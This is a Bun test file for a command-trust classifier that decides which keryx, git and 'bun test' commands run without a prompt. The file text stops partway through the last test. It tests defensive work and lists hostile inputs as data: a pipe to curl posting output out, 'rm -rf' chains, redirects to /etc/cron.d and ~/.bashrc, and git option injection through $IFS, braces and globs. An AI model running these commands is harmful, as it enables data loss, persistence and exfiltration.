// Flow 426 AC1/AC2 and Flow 441 AC6: the routine-command table is one named list, every row has a command that runs
// without a prompt, and everything outside it (or joined to it in a risky way) still asks.

import { afterEach, expect, spyOn, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import {
  TRUST_ROUTINE_KEYRYX,
  TRUST_ROUTINE_TOOLS,
  isTrustRoutineCommand,
  isTrustRoutineTool,
  recordBunfigBaseline,
} from "./trust-routine-command";
import { hasUnquotedExpansion, splitWords } from "./shell-syntax";

test("AC1: the table names the read-only keryx commands of the frozen criteria", () => {
  const ids = TRUST_ROUTINE_KEYRYX.map((entry) => entry.id);
  for (const id of [
    "help",
    "command-help",
    "harness list",
    "harness status",
    "harness --help",
    "agents external list",
    "review ledger",
    "review status",
    "review required",
    "review reviewers",
    "review tier",
    "review retry-plan",
    "review dispatch-check",
    "review layers",
    "review chunks",
    "review coverage",
    "flow status",
    "flow list",
    "flow next",
  ]) {
    expect(ids).toContain(id);
  }
  expect(ids.length).toBe(new Set(ids).size);
});

for (const entry of TRUST_ROUTINE_KEYRYX) {
  test(`AC1: ${entry.id} runs without a prompt (${entry.example})`, () => {
    expect(isTrustRoutineCommand(entry.example)).toBe(true);
  });
}

test("AC1: the review ledger examples from the criteria are routine", () => {
  for (const command of [
    "keryx help",
    "keryx help harness",
    "keryx review --help",
    "keryx harness --help",
    "keryx harness list",
    "keryx harness status",
    "keryx agents external list --no-probe",
    "keryx agents external list --json --no-probe",
    "keryx review ledger build --base main",
    "keryx review ledger status",
    "keryx review required",
    "keryx review reviewers",
    "keryx review tier",
    "keryx review retry-plan",
    "keryx review dispatch-check",
    "keryx review layers status --package p",
    "keryx review chunks next --package p",
    "keryx review chunks estimate --package p",
    "keryx review coverage --package p",
    "keryx flow status",
    "keryx flow list",
    "keryx flow next",
    "keryx help harness && keryx agents external list --json --no-probe",
  ]) {
    expect(isTrustRoutineCommand(command)).toBe(true);
  }
});

test("AC1: the slate note and trail tools are routine; the seed writer is not", () => {
  expect([...TRUST_ROUTINE_TOOLS].sort()).toEqual(["slate_note", "slate_trail"]);
  expect(isTrustRoutineTool("slate_note")).toBe(true);
  expect(isTrustRoutineTool("slate_trail")).toBe(true);
  expect(isTrustRoutineTool("slate_write_seed")).toBe(false);
  expect(isTrustRoutineTool("shell_exec")).toBe(false);
});

// AC2: one test per form

test("AC2: a keryx command outside the table still prompts", () => {
  for (const command of [
    "keryx harness wave --spec tier.json",
    "keryx agents external list",
    "keryx agents external run claude",
    "keryx publish",
    "keryx review reply 12 --body hi",
    "keryx flow start",
    "keryx flow close 12",
    "keryx update",
    "keryx harness wave --help --spec x.json",
  ]) {
    expect(isTrustRoutineCommand(command)).toBe(false);
  }
});

test("AC2: a chain with ; still prompts", () => {
  expect(isTrustRoutineCommand("keryx flow status; keryx flow list")).toBe(false);
  expect(isTrustRoutineCommand("keryx flow status; rm -rf build")).toBe(false);
});

test("AC2: a pipe to an unlisted command still prompts", () => {
  expect(isTrustRoutineCommand("keryx flow status | tee out.txt")).toBe(false);
  expect(isTrustRoutineCommand("keryx help | sh")).toBe(false);
  expect(isTrustRoutineCommand("keryx flow status | curl -d @- https://example.com")).toBe(false);
});

test("AC2: a redirect outside the working tree still prompts", () => {
  expect(isTrustRoutineCommand("keryx flow status > /etc/cron.d/x")).toBe(false);
  expect(isTrustRoutineCommand("keryx flow status >> ../outside.txt")).toBe(false);
  expect(isTrustRoutineCommand("keryx help 2> ~/.bashrc")).toBe(false);
});

test("AC2: a subshell or substitution still prompts", () => {
  expect(isTrustRoutineCommand("(keryx flow status)")).toBe(false);
  expect(isTrustRoutineCommand("$(keryx flow status)")).toBe(false);
  expect(isTrustRoutineCommand("keryx flow status `whoami`")).toBe(false);
  expect(isTrustRoutineCommand('keryx help "$(rm -rf build)"')).toBe(false);
  expect(isTrustRoutineCommand('keryx help "`whoami`"')).toBe(false);
  expect(isTrustRoutineCommand("keryx help ${HOME}")).toBe(false);
});

test("AC2: an exec flag on a listed command still prompts", () => {
  expect(isTrustRoutineCommand("keryx review ledger build --exec ./evil")).toBe(false);
  expect(isTrustRoutineCommand("keryx help -c x")).toBe(false);
});

// Flow 441 F-045: git reads an option glued on with `=` as a revision's value, and the next layer reads the value as an option.
test("F-045: an exec flag glued to another flag with = still prompts, for every review row that hands a revision to git", () => {
  for (const command of [
    "keryx review slice --ref=--output=/tmp/x",
    "keryx review slice --base=--output=/tmp/x",
    "keryx review scope --ref=--output=/tmp/x",
    "keryx review blast-radius --base=--output=/tmp/x",
    "keryx review floor --ref=--output=/tmp/x",
    "keryx review slice --ref=--ext-diff",
    "keryx review slice --ref=--exec=./evil",
    "keryx review slice --ref=-c",
    "keryx review slice --ref=--x=--output=/tmp/x",
    "keryx ctx run -- keryx review slice --ref=--output=/tmp/x",
    "keryx flow status --x=--output=/tmp/x",
    "git diff --relative=--output=/tmp/x",
  ]) {
    expect(isTrustRoutineCommand(command, { cwd: projectDir() })).toBe(false);
  }
});

test("F-045: a review flag glued to a value that starts with - prompts, whatever the flag is", () => {
  const cwd = projectDir();
  for (const command of [
    "keryx review slice --ref=-U0",
    "keryx review slice --ref=--no-index",
    "keryx review slice --since=-U0",
    "keryx review slice --diff=--no-index",
    "keryx review scope --scope=-c1",
    "keryx review blast-radius --base=-x",
  ]) {
    expect(isTrustRoutineCommand(command, { cwd }), command).toBe(false);
  }
});

test("F-059: a lone - glued to a flag is the standard-input spelling and stays routine, as the separated form does", () => {
  const cwd = projectDir();
  for (const command of ["keryx review slice --diff=-", "keryx review slice --diff -"]) {
    expect(isTrustRoutineCommand(command, { cwd }), command).toBe(true);
  }
});

test("F-058: a word the shell turns into an exec option (backslash, brace, $'...') prompts", () => {
  const cwd = projectDir();
  for (const command of [
    "git diff \\--output=/tmp/x",
    "git diff --out\\put=/tmp/x",
    "git diff {--output=/tmp/x}",
    "git diff --\\pre=sh",
    "keryx ctx diff \\--output=/tmp/x",
    "keryx ctx rg --\\pre=sh foo",
    "keryx review slice --ref=\\--output=/tmp/x",
    "keryx review slice --ref={--output=/tmp/x,y}",
    "git diff $'--output'=/tmp/x",
    'git diff $"--output"=/tmp/x',
  ]) {
    expect(isTrustRoutineCommand(command, { cwd }), command).toBe(false);
  }
});

test("F-066: the five spellings the shell turns into an exec option prompt", () => {
  const cwd = projectDir();
  for (const command of [
    'git log -S "\\"" --output=/tmp/x',
    "git diff HEAD$IFS--output=/tmp/x",
    'git diff "HEAD"$IFS"--output=/tmp/x"',
    "git diff $'\\x2d\\x2doutput=/tmp/x'",
    "git diff {HEAD,--output=/tmp/x}",
    "git diff --output=/tmp/x",
  ]) {
    expect(isTrustRoutineCommand(command, { cwd }), command).toBe(false);
  }
});

test("F-066: an unquoted backslash, brace or $ in a git or keryx segment prompts, a quoted one does not", () => {
  const cwd = projectDir();
  for (const command of ["keryx ctx rg -n \\bfoo src", "git log HEAD@{1}", "keryx ctx diff HEAD$X", "git log -n 1 \\-p"]) {
    expect(isTrustRoutineCommand(command, { cwd }), command).toBe(false);
  }
  for (const command of [
    "keryx ctx rg 'a\\|b' src",
    "keryx ctx rg -n '\\bfoo' src",
    "git log 'HEAD@{1}'",
    "git log --pretty=format:'%h'",
    "keryx ctx rg --glob='*.{ts,tsx}' foo",
    'git log --grep="a\\"b"',
  ]) {
    expect(isTrustRoutineCommand(command, { cwd }), command).toBe(true);
  }
});

test("R3-01: an unquoted glob character or a word-initial ~ in a git or keryx segment prompts, a quoted or mid-word one does not", () => {
  const cwd = projectDir();
  for (const command of [
    "git log --o*",
    "git log --o?tput=x",
    "git log --[o]utput=x",
    "git log *",
    "keryx ctx diff *",
    "keryx ctx diff --o*",
    "keryx review slice --ref=--o*",
    "keryx review slice --ref ~/x",
    "git diff ~root",
    "keryx ctx rg foo ~/src",
  ]) {
    expect(isTrustRoutineCommand(command, { cwd }), command).toBe(false);
  }
  for (const command of [
    "git log '--o*'",
    'git log "--o*"',
    "keryx ctx diff '*'",
    "keryx ctx rg --glob '*.ts' foo",
    "keryx ctx rg 'a?b' src",
    "keryx ctx rg '[a-z]+' src",
    "git log '~root'",
    "git log HEAD~1",
    "keryx review slice --ref=HEAD~2",
  ]) {
    expect(isTrustRoutineCommand(command, { cwd }), command).toBe(true);
  }
});

test("R3-01: the glob in `git log --o*` never reaches git, so the planted --output=injected file is not written", () => {
  const dir = mkdtempSync(path.join(tmpdir(), "r3-01-"));
  try {
    execFileSync("git", ["init", "-q"], { cwd: dir });
    execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false", "commit", "-q", "--allow-empty", "-m", "x"], { cwd: dir });
    writeFileSync(path.join(dir, "--output=injected"), "");
    expect(isTrustRoutineCommand("git log --o*", { cwd: dir })).toBe(false);
    expect(hasUnquotedExpansion("git log --o*")).toBe(true);
    expect(existsSync(path.join(dir, "injected"))).toBe(false);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("R3-01: glob characters and ~ are refused unquoted and allowed quoted, one per character", () => {
  for (const ch of ["*", "?", "["]) {
    expect(hasUnquotedExpansion(`git log a${ch}b`), ch).toBe(true);
    expect(hasUnquotedExpansion(`git log 'a${ch}b'`), ch).toBe(false);
  }
  expect(hasUnquotedExpansion("git log ~x")).toBe(true);
  expect(hasUnquotedExpansion("~x")).toBe(true);
  expect(hasUnquotedExpansion("git log a~x")).toBe(false);
  expect(hasUnquotedExpansion("git log '~x'")).toBe(false);
});

test("F-066: an unterminated quote counts as an expansion, a balanced one does not", () => {
  expect(hasUnquotedExpansion("git log 'abc")).toBe(true);
  expect(hasUnquotedExpansion('git log "abc')).toBe(true);
  expect(hasUnquotedExpansion("git log 'abc' \"def\"")).toBe(false);
});

test("F-066: a backslash inside double quotes does not end the quote for the word split", () => {
  expect(splitWords('git log -S "\\"" --output=x')).toEqual(["git", "log", "-S", '\\"', "--output=x"]);
});

test("F-077: an exec flag after any number of = and a -c tail prompt, straight from the word check", () => {
  const cwd = projectDir();
  for (const command of ["git diff --x=-c", "git diff --x=--ext-diff", "git diff --x=--y=--exec=sh", "keryx review slice --ref=--x=-c"]) {
    expect(isTrustRoutineCommand(command, { cwd }), command).toBe(false);
  }
});

test("F-060: a very long chain of glued = signs gets a verdict, not a stack overflow", () => {
  expect(isTrustRoutineCommand(`keryx review slice --ref=${"-=".repeat(60_000)}`, { cwd: projectDir() })).toBe(false);
  expect(isTrustRoutineCommand(`git diff ${"-=".repeat(60_000)}--output=x`, { cwd: projectDir() })).toBe(false);
});

test("F-045: a glued value that is a plain revision, a path or a count stays routine", () => {
  const cwd = projectDir();
  for (const command of [
    "keryx review slice --ref=origin/main",
    "keryx review slice --ref=HEAD~1 --context=3",
    "keryx review slice --ref origin/main",
    "keryx review blast-radius --base=a=b",
    "git diff --stat=100",
    "git log --format=--oneline",
    "git log -- x=-c",
    "keryx flow status --x=-1",
    "keryx gdgraph context --x=-1",
    "keryx ctx rg -cn foo src",
    "keryx ctx rg -e=-foo src",
    "keryx review slice -x=-1",
    "keryx ctx rg --pre-glob '*.gz' foo src",
    "git diff --output-indicator-new=+",
  ]) {
    expect(isTrustRoutineCommand(command, { cwd })).toBe(true);
  }
});

test("F-058: an unbalanced brace, a lone closing brace and a newline in a glued dash value are refused, as the shell spellings are", () => {
  const cwd = projectDir();
  for (const command of ["keryx review slice {--a", "keryx review slice --a}b", "keryx review slice '--ref=-\nx'"]) {
    expect(isTrustRoutineCommand(command, { cwd }), command).toBe(false);
  }
});

// Flow 441 (F-007, F-008): `bun test` and the review path flags.

const madeDirs: string[] = [];
const originalCwd = process.cwd();
const originalCdpath = process.env.CDPATH;
afterEach(() => {
  process.chdir(originalCwd);
  if (originalCdpath === undefined) delete process.env.CDPATH;
  else process.env.CDPATH = originalCdpath;
  for (const dir of madeDirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

function projectDir(bunfig?: string, options: { baseline?: boolean } = {}): string {
  const dir = realpathSync(mkdtempSync(path.join(tmpdir(), "keryx-trust-")));
  madeDirs.push(dir);
  mkdirSync(path.join(dir, ".git"));
  mkdirSync(path.join(dir, ".metaproject"));
  mkdirSync(path.join(dir, "sub"));
  if (bunfig !== undefined) writeFileSync(path.join(dir, "bunfig.toml"), bunfig);
  if (options.baseline !== false) recordBunfigBaseline(dir);
  return dir;
}

test("AC5: bun test with a preload, a path, an output flag or another directory still prompts", () => {
  const dir = projectDir();
  for (const command of [
    "bun test --preload ./x.ts",
    "keryx ctx run -- bun test --preload ./x.ts",
    "bun test ./some/file.test.ts",
    "bun test --coverage-dir /tmp/x",
    "cd /tmp/other && bun test",
    "cd sub && bun test",
    "cd ~ && bun test",
    "cd $HOME && bun test",
    "FOO=1 bun test",
  ]) {
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: false });
  }
});

test("AC6: plain bun test and the closed allow-list are routine in the project root", () => {
  const dir = projectDir();
  for (const command of [
    "bun test",
    "bun test --bail",
    "bun test --only",
    "bun test --todo",
    "bun test --rerun-each 3",
    "bun test --timeout 5000",
    "bun test --timeout=5000 --bail",
    "keryx ctx run -- bun test",
    "cd . && bun test",
    "cd sub && cd .. && bun test",
    `cd ${dir} && bun test`,
  ]) {
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: true });
  }
});

test("AC6: any other flag or value still prompts", () => {
  const dir = projectDir();
  for (const command of [
    "bun test --rerun-each",
    "bun test --rerun-each x",
    "bun test --rerun-each -1",
    "bun test --rerun-each 1.5",
    "bun test --timeout 5s",
    "bun test --timeout=",
    "bun test --timeout 5 extra",
    "bun test --bail=3",
    "bun test --watch",
    "bun test --update-snapshots",
    "bun test src/a.test.ts",
    "bun test --timeout 5 --coverage",
  ]) {
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: false });
  }
});

test("AC6: bun test prompts once bunfig.toml changed after the session recorded it", () => {
  const dir = projectDir("[test]\ntimeout = 1000\n");
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(true);
  writeFileSync(path.join(dir, "bunfig.toml"), "[test]\ntimeout = 2000\n");
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(false);
  expect(isTrustRoutineCommand("bun test --bail", { cwd: dir })).toBe(false);
});

test("AC6: bun test prompts when bunfig.toml appears after the baseline", () => {
  const dir = projectDir();
  writeFileSync(path.join(dir, "bunfig.toml"), "[test]\ntimeout = 1000\n");
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(false);
});

test("AC6: bun test prompts when bunfig.toml carries a preload, even an unchanged one", () => {
  for (const bunfig of ['[test]\npreload = ["./x.ts"]\n', 'preload = ["./x.ts"]\n', '[run]\n  "preload" = "./x.ts"\n', "test.preload = ['./x.ts']\n"]) {
    const dir = projectDir(bunfig);
    expect({ bunfig, routine: isTrustRoutineCommand("bun test", { cwd: dir }) }).toEqual({ bunfig, routine: false });
  }
});

test("AC6: bun test prompts when the session never recorded a bunfig.toml baseline", () => {
  const dir = projectDir(undefined, { baseline: false });
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(false);
});

test("AC7: after untrusted content no bun test form is routine", () => {
  const dir = projectDir();
  for (const command of ["bun test", "bun test --bail", "bun test --timeout 5", "keryx ctx run -- bun test", "cd . && bun test", "bun test x.test.ts"]) {
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir, untrustedContent: true }) }).toEqual({ command, routine: false });
  }
  expect(isTrustRoutineCommand("keryx flow status", { cwd: dir, untrustedContent: true })).toBe(true);
});

test("Flow 441 F-012: a count flag with a value that is not a plain non-negative integer still prompts", () => {
  const dir = projectDir();
  for (const command of ["bun test --timeout=5s", "bun test --timeout=1.5", "bun test --timeout=-1", "bun test --rerun-each=x"]) {
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: false });
  }
  for (const command of ["bun test --rerun-each=3", "bun test --timeout=5"]) {
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: true });
  }
});

test("Flow 441 F-008: a preload spelled as an inline table, with single quotes or with an escaped key still prompts", () => {
  for (const bunfig of ['test = {preload = ["./x.ts"]}\n', "[test]\n'preload' = ['./x.ts']\n", '[test]\n"pre\\u006coad" = ["./x.ts"]\n', "[test\n"]) {
    const dir = projectDir(bunfig);
    expect({ bunfig, routine: isTrustRoutineCommand("bun test", { cwd: dir }) }).toEqual({ bunfig, routine: false });
  }
});

test("Flow 441 F-012: a bunfig.toml that is a directory, and a second baseline after a rewrite", () => {
  const unreadable = projectDir(undefined, { baseline: false });
  mkdirSync(path.join(unreadable, "bunfig.toml"));
  recordBunfigBaseline(unreadable);
  expect(isTrustRoutineCommand("bun test", { cwd: unreadable })).toBe(false);

  const dir = projectDir("[test]\ntimeout = 1000\n");
  writeFileSync(path.join(dir, "bunfig.toml"), "[test]\ntimeout = 2000\n");
  recordBunfigBaseline(dir);
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(false);
});

test("Flow 441 F-018: a cd inside keryx ctx run does not move the segments after it", () => {
  const dir = projectDir();
  expect(isTrustRoutineCommand("keryx ctx run -- cd /tmp && bun test", { cwd: dir })).toBe(true);
  expect(isTrustRoutineCommand("cd /tmp && bun test", { cwd: dir })).toBe(false);
});

test("Flow 441 F-001: a cd whose target the shell may read as an option, or resolve elsewhere, is not followed", () => {
  const dir = projectDir();
  for (const target of ["--", "-P", "-L", "-", "\\.\\.", ".?", "~", "$HOME", "*", "{a,b}"]) {
    for (const tail of ["keryx review slice --out x.json", "keryx review retry-plan --manifest m.json", "bun test"]) {
      const command = `cd ${target} && ${tail}`;
      expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: false });
    }
  }
  expect(isTrustRoutineCommand("cd sub && keryx review slice --out x.json", { cwd: dir })).toBe(true);
});

test("Flow 441 F-001: a cd to a relative name is not followed while CDPATH is set", () => {
  const dir = projectDir();
  const before = process.env.CDPATH;
  process.env.CDPATH = "/tmp";
  try {
    expect(isTrustRoutineCommand("cd sub && keryx review slice --out x.json", { cwd: dir })).toBe(false);
    expect(isTrustRoutineCommand("cd ./sub && keryx review slice --out x.json", { cwd: dir })).toBe(true);
  } finally {
    if (before === undefined) delete process.env.CDPATH;
    else process.env.CDPATH = before;
  }
});

const PATH_FLAG_ROWS: ReadonlyArray<readonly [string, string]> = [
  ["keryx review slice", "--out"],
  ["keryx review slice", "--diff"],
  ["keryx review retry-plan", "--manifest"],
  ["keryx review retry-plan", "--state"],
  ["keryx review retry-plan", "--result"],
  ["keryx review dispatch-check", "--manifest"],
  ["keryx review dispatch-check", "--payload"],
];

for (const [command, flag] of PATH_FLAG_ROWS) {
  test(`AC10: ${command} ${flag} is routine only when the path stays inside the project`, () => {
    const dir = projectDir();
    const outside = realpathSync(mkdtempSync(path.join(tmpdir(), "keryx-trust-out-")));
    madeDirs.push(outside);
    symlinkSync(outside, path.join(dir, "escape"));
    const run = (value: string, form: "space" | "equals" = "space") =>
      isTrustRoutineCommand(form === "space" ? `${command} ${flag} ${value}` : `${command} ${flag}=${value}`, { cwd: dir });
    expect(isTrustRoutineCommand(command, { cwd: dir })).toBe(true);
    for (const inside of ["out/x.json", ".metaproject/reviews/r1/x.json", "./x.json", path.join(dir, "x.json")]) {
      expect({ inside, routine: run(inside) }).toEqual({ inside, routine: true });
      expect({ inside, routine: run(inside, "equals") }).toEqual({ inside, routine: true });
    }
    for (const out of ["/tmp/x.json", "../x.json", path.join(outside, "x.json"), "escape/x.json", "~/x.json", "$HOME/x.json", "x*", ".?/x", "a[0]/x"]) {
      expect({ out, routine: run(out) }).toEqual({ out, routine: false });
      expect({ out, routine: run(out, "equals") }).toEqual({ out, routine: false });
    }
    expect(isTrustRoutineCommand(`keryx ctx run -- ${command} ${flag} /tmp/x.json`, { cwd: dir })).toBe(false);
    expect(isTrustRoutineCommand(`keryx ctx run -- ${command} ${flag} out/x.json`, { cwd: dir })).toBe(true);
    expect(isTrustRoutineCommand(`${command} ${flag} out/a.json ${flag} /tmp/b.json`, { cwd: dir })).toBe(false);
    expect(isTrustRoutineCommand(`cd .. && ${command} ${flag} x.json`, { cwd: dir })).toBe(false);
    expect(isTrustRoutineCommand(`cd sub && ${command} ${flag} x.json`, { cwd: dir })).toBe(true);
    if (["--diff", "--payload", "--result"].includes(flag)) {
      expect(isTrustRoutineCommand(`${command} ${flag} -`, { cwd: dir })).toBe(true);
    }
  });
}

// Flow 441 round 2 (F-024..F-028, F-036..F-039): symlinked directories, non-regular bunfig, subcommands, keying.

test("Flow 441 F-024: a cd into a symlink that points into another repository is not followed", () => {
  const dir = projectDir();
  const elsewhere = realpathSync(mkdtempSync(path.join(tmpdir(), "keryx-trust-elsewhere-")));
  madeDirs.push(elsewhere);
  mkdirSync(path.join(elsewhere, ".git"));
  symlinkSync(elsewhere, path.join(dir, "link"));
  for (const tail of [
    "keryx review slice --diff - --out ../x",
    "keryx review retry-plan --manifest ../m.json --state ../s.json",
    "bun test",
  ]) {
    const command = `cd link && ${tail}`;
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: false });
  }
  expect(isTrustRoutineCommand("cd sub && keryx review slice --diff - --out ../x", { cwd: dir })).toBe(true);
});

test("Flow 441 F-024: a cd into a symlink to a directory inside the project is not followed either", () => {
  const dir = projectDir();
  symlinkSync(path.join(dir, "sub"), path.join(dir, "inner"));
  expect(isTrustRoutineCommand("cd inner && keryx review slice --out ../x", { cwd: dir })).toBe(false);
});

test("Flow 441 F-025: a bunfig.toml that is a FIFO, a link to one, or larger than the cap never blocks and is not routine", () => {
  const fifo = projectDir(undefined, { baseline: false });
  execFileSync("mkfifo", [path.join(fifo, "bunfig.toml")]);
  recordBunfigBaseline(fifo);
  expect(isTrustRoutineCommand("bun test", { cwd: fifo })).toBe(false);

  const linked = projectDir(undefined, { baseline: false });
  execFileSync("mkfifo", [path.join(linked, "pipe")]);
  symlinkSync(path.join(linked, "pipe"), path.join(linked, "bunfig.toml"));
  recordBunfigBaseline(linked);
  expect(isTrustRoutineCommand("bun test", { cwd: linked })).toBe(false);

  const big = projectDir(`# ${"x".repeat(300 * 1024)}\n[test]\ntimeout = 1\n`);
  expect(isTrustRoutineCommand("bun test", { cwd: big })).toBe(false);
}, 5000);

test("Flow 441 F-025: a bunfig.toml of exactly 256 KiB is read, one byte more is not", () => {
  const cap = 256 * 1024;
  const comment = (bytes: number): string => `#${"x".repeat(bytes - 2)}\n`;
  expect(isTrustRoutineCommand("bun test", { cwd: projectDir(comment(cap)) })).toBe(true);
  expect(isTrustRoutineCommand("bun test", { cwd: projectDir(comment(cap + 1)) })).toBe(false);
});

// The backtick and the assignment prefix are refused by earlier guards (the command-wide backtick check and the
// stripAssignments length check) before the later ones run, so this pins the command lines, not those later guards.
test("Flow 441 F-036: a command line with an assignment prefix, a backslash or a backtick in a path value is not routine", () => {
  const dir = projectDir();
  expect(isTrustRoutineCommand("keryx review status", { cwd: dir })).toBe(true);
  for (const command of ["FOO=1 bun test", "FOO=1 keryx review status", "keryx review slice --out a\\b", "keryx review slice --out a`x`"]) {
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: false });
  }
});

test("Flow 441 F-027: only the test subcommand of bun is routine", () => {
  const dir = projectDir();
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(true);
  for (const command of ["bun", "bun install", "bun run", "bun upgrade", "bun update", "bun x", "bun add left-pad"]) {
    expect({ command, routine: isTrustRoutineCommand(command, { cwd: dir }) }).toEqual({ command, routine: false });
  }
});

test("Flow 441 F-036: bare cd and cd with two operands are not routine, and neither throws", () => {
  const dir = projectDir();
  expect(isTrustRoutineCommand("cd && bun test", { cwd: dir })).toBe(false);
  expect(isTrustRoutineCommand("cd sub sub && keryx review status", { cwd: dir })).toBe(false);
});

test("Flow 441 F-036: a bunfig with ordinary string values and no preload stays routine", () => {
  const dir = projectDir('[install]\nregistry = "https://example.invalid"\n');
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(true);
});

test("Flow 441 F-037: the baseline is keyed by the project root, through symlinks, and the default directory is the process one", () => {
  const fromSub = projectDir(undefined, { baseline: false });
  recordBunfigBaseline(path.join(fromSub, "sub"));
  expect(isTrustRoutineCommand("bun test", { cwd: fromSub })).toBe(true);

  const viaLink = projectDir(undefined, { baseline: false });
  const link = `${viaLink}-lnk`;
  symlinkSync(viaLink, link);
  madeDirs.push(link);
  recordBunfigBaseline(link);
  expect(isTrustRoutineCommand("bun test", { cwd: viaLink })).toBe(true);
  expect(isTrustRoutineCommand("bun test", { cwd: link })).toBe(true);

  const inProcessDir = projectDir(undefined, { baseline: false });
  process.chdir(inProcessDir);
  recordBunfigBaseline();
  expect(isTrustRoutineCommand("bun test")).toBe(true);
});

test("Flow 441 F-038: a repeated path flag is judged on every occurrence, an expandable one included", () => {
  const dir = projectDir();
  expect(isTrustRoutineCommand("keryx review slice --out=ok --out $X", { cwd: dir })).toBe(false);
  expect(isTrustRoutineCommand("keryx review slice --out ok --out=$X", { cwd: dir })).toBe(false);
});

test("Flow 441 F-038: a command run from a subdirectory is judged against the project root, not the subdirectory", () => {
  const dir = projectDir();
  expect(isTrustRoutineCommand("keryx review slice --out ../out", { cwd: path.join(dir, "sub") })).toBe(true);
});

test("Flow 441 F-039: under CDPATH an absolute, ./ or ../ target is still followed and a bare name is not", () => {
  const dir = projectDir();
  process.env.CDPATH = "/tmp";
  expect(isTrustRoutineCommand(`cd ${dir}/sub && keryx review slice --out x`, { cwd: dir })).toBe(true);
  expect(isTrustRoutineCommand("cd ../ && keryx review slice --out x", { cwd: path.join(dir, "sub") })).toBe(true);
  expect(isTrustRoutineCommand("cd sub && keryx review slice --out x", { cwd: dir })).toBe(false);
  process.env.CDPATH = "";
  expect(isTrustRoutineCommand("cd sub && keryx review slice --out x", { cwd: dir })).toBe(true);
});

test("Flow 441 F-039: a project reached through a symlink is the same project, and a cd inside it is still followed", () => {
  const dir = projectDir();
  const link = `${dir}-lnk2`;
  symlinkSync(dir, link);
  madeDirs.push(link);
  expect(isTrustRoutineCommand("bun test", { cwd: link })).toBe(true);
  expect(isTrustRoutineCommand("keryx review slice --out sub/x", { cwd: link })).toBe(true);
  expect(isTrustRoutineCommand("cd sub && keryx review slice --out x", { cwd: link })).toBe(true);
});

// Flow 441 round 3 (F-047, F-050, F-051, F-055): one descriptor for the bunfig, the error kinds, the flag-less guard.

test("Flow 441 F-050: a bunfig.toml that cannot be opened (a link to itself) is not routine, and is not taken for an absent one", () => {
  const dir = projectDir(undefined, { baseline: false });
  symlinkSync("bunfig.toml", path.join(dir, "bunfig.toml"));
  recordBunfigBaseline(dir);
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(false);
});

test("Flow 441 F-050: a bunfig.toml without read permission is not routine and is not taken for an absent one", () => {
  if (process.getuid?.() === 0) return;
  const dir = projectDir(undefined, { baseline: false });
  const file = path.join(dir, "bunfig.toml");
  writeFileSync(file, "[test]\ntimeout = 1\n");
  chmodSync(file, 0o000);
  recordBunfigBaseline(dir);
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(false);
  chmodSync(file, 0o600);
});

test("Flow 441 F-050: an oversized baseline that is then removed is a changed file, not an unchanged one", () => {
  const dir = projectDir(`# ${"x".repeat(300 * 1024)}\n`);
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(false);
  rmSync(path.join(dir, "bunfig.toml"));
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(false);
});

test("Flow 441 F-047: a bunfig.toml swapped for a FIFO after the baseline is refused without blocking", () => {
  const dir = projectDir("[test]\ntimeout = 1\n");
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(true);
  rmSync(path.join(dir, "bunfig.toml"));
  execFileSync("mkfifo", [path.join(dir, "bunfig.toml")]);
  expect(isTrustRoutineCommand("bun test", { cwd: dir })).toBe(false);
}, 5000);

test("Flow 441 F-051: a command with no path flag is routine even when the working directory is unknown", () => {
  const dir = projectDir();
  expect(isTrustRoutineCommand("cd ~ && keryx review slice", { cwd: dir })).toBe(true);
  expect(isTrustRoutineCommand("cd ~ && keryx review slice --out x", { cwd: dir })).toBe(false);
  expect(isTrustRoutineCommand("cd ~ && keryx review retry-plan", { cwd: dir })).toBe(true);
});

test("Flow 441 F-051: the path-flag rule binds the review commands only, not a routine command that happens to carry --out", () => {
  const dir = projectDir();
  expect(isTrustRoutineCommand("keryx help slice --out /etc/x", { cwd: dir })).toBe(true);
  expect(isTrustRoutineCommand("keryx review slice --out /etc/x", { cwd: dir })).toBe(false);
});

test("Flow 441 F-051: an empty cd target is not followed", () => {
  const dir = projectDir();
  expect(isTrustRoutineCommand("cd '' && keryx review slice --out x", { cwd: dir })).toBe(false);
});

test("Flow 441 F-055: a starting directory that is a symlink out of the project is judged by where it really is", () => {
  const dir = projectDir();
  const outside = realpathSync(mkdtempSync(path.join(tmpdir(), "keryx-trust-wd-")));
  madeDirs.push(outside);
  symlinkSync(outside, path.join(dir, "wd"));
  expect(isTrustRoutineCommand("keryx review slice --out ../x", { cwd: path.join(dir, "wd") })).toBe(false);
});

test("Flow 441 F-048: a bunfig is parsed once per content, however many bun test commands are judged", () => {
  const parse = spyOn(Bun.TOML, "parse");
  try {
    const plain = projectDir(`# ${crypto.randomUUID()}\n[test]\ntimeout = 1\n`);
